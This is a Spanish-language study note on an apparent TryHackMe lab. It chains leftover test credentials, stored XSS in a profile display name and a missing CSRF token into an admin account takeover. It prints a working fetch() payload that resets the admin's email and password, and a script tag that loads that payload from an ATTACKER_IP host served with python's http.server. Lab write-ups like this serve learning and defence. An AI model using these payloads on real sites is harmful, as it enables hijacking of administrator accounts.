---
layout: apunte
title: "3. Guided Chain"
---

En esta tarea vamos a ver una cadena de ataque completa, pieza a pieza. Cada fase nos mostrará cómo lo que parece ser una debilidad muy leve puede abrir la puerta a algo mucho mayor. Esto no es sobre descubrir un sólo bug crítico, sino reconocer debilidades menores que cuando las combinas pueden llevar a un compromiso completo del sistema.

<h3>Paso 1: Credenciales de Testeo de Desarrollador</h3>
Lo primero que haces al acercarte a cualquier formulario de login es probar lo fácil. En este caso, la aplicación web hosteada tiene una cuenta de testeo dejada atrás por el desarrollador: `testuser` con la contraseña `password123`. Esto no es poco común, los desarrolladores suelen dejar información de testeo en lugar del desarrollo, y si llega a producción, es una ventaja para los atacantes.

!**Pasted image 20260330184811.png**

Iniciando sesión como usuario no privilegiado, obtenemos acceso a funcionalidades básicas.

!**Pasted image 20260330184838.png**

<h3>Paso 2: XSS Stored en Perfil de Usuario</h3>
Después de iniciar sesión, exploramos la página de edición del perfil y notamos que el campo `display name` refleja el input directamente en la página sin sanitización adecuada. 

!**Pasted image 20260330185042.png**

Intentas insertar un payload básico como `<script>alert(1)</script>` y te devuelve la alerta.

!**Pasted image 20260330185044.png**

Aquí es justo donde el pensamiento del atacante entra. La vulnerabilidad está clara, pero ¿cómo puedo usarla para escalar? Sabemos que el admin puede ver este perfil (quizá como parte de flujo de moderación), por lo que toca convertir eso en algo accionable.

<h3>Paso 3: CSRF via XSS - Encadenar las Credenciales del Admin</h3>
Pausemos y pensemos: con un stored XSS como este, podríamos conseguir tomar la cuenta de un usuario completamente usando JavaScript. Puedes leer el DOM, extraer token CSRF y configurar una petición legítima.

En nuestro caso, la aplicación no implementa tokens CSRF. Esto hace las cosas más sencillas. Cuando tu XSS se dispara en el navegador del administrador, puedes mandar una petición POST same-origin para cambiar el email y la contraseña del usuario y el navegador usará las cookies automáticamente.

!**Pasted image 20260330185425.png**

Este es el script que puedes hostear en tu máquina de atacante.

```javascript
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwnedadmin@evil.local&password=pwnedadmin'
});
```

Una vez que el admin visita tu perfil, su sesión mandará silenciosamente esa petición y sus credenciales serán actualizadas.

!**Pasted image 20260330185545.png**

Para inyectar esto, simplemente configura tu `display name` a:

```html
<script src="http://ATTACKER_IP:8000/script.js"></script>
```

!**Pasted image 20260330185717.png**

Asegúrate de que tu máquina sirve el archivo:

```bash
user@tryhackme:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
MACHINE_IP - - [06/Jul/2025 20:14:05] "GET /script.js HTTP/1.1" 200 -
```

<h3>Paso 4: Inicia sesión como Admin</h3>
En este punto, tu XSS ha hecho su trabajo; las credenciales de admin han cambiado sin que lo sepa. Ahora puedes usarlas para iniciar sesión: `admin:pwnedadmin`.

!**Pasted image 20260330185834.png**

Ahora todas las funcionalidades de administrador están disponibles para ti.

